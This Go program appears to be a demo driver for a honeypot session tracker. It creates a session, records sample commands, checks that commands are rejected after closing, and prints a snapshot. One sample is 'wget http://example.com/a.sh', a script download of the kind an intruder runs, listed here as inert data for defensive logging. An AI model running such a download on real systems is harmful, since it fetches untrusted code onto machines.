package main

import (
	"fmt"
	"honeypot-day3/internal/session"
	"os"
	"time"
)

func main() {
	startedAt := time.Date(2026, time.August, 13, 9, 0, 0, 0, time.UTC)
	sess, err := session.NewSession("sess-001", "203.0.113.10", startedAt)
	if err != nil {
		fmt.Fprintln(os.Stderr, "create session:", err)
		os.Exit(1)
	}

	commands := []string{
		"whoami",
		"wget http://example.com/a.sh",
	}

	for _, command := range commands {
		if err := sess.AddCommand(); err != nil {
			fmt.Fprintln(os.Stderr, "record command:", err)
			os.Exit(1)
		}
		fmt.Printf("recorded command: %q\n", command)
	}

	sess.Close()
	if err := sess.AddCommand(); err != nil {
		fmt.Println("rejected command after Close:", err)
	} else {
		fmt.Fprintln(os.Stderr, "expected command after Close to be rejected")
		os.Exit(1)
	}

	fmt.Println()
	printSnapshot(sess.Snapshot())
}

func printSnapshot(snapshot session.Snapshot) {
	fmt.Println("=== Session Snapshot ===")
	fmt.Printf("ID:            %s\n", snapshot.Identity.ID)
	fmt.Printf("Source IP:     %s\n", snapshot.Identity.SourceIP)
	fmt.Printf("Started at:    %s\n", snapshot.StartedAt.Format(time.RFC3339))
	fmt.Printf("Command count: %d\n", snapshot.CommandCount)
	fmt.Printf("Closed:        %t\n", snapshot.Closed)
}
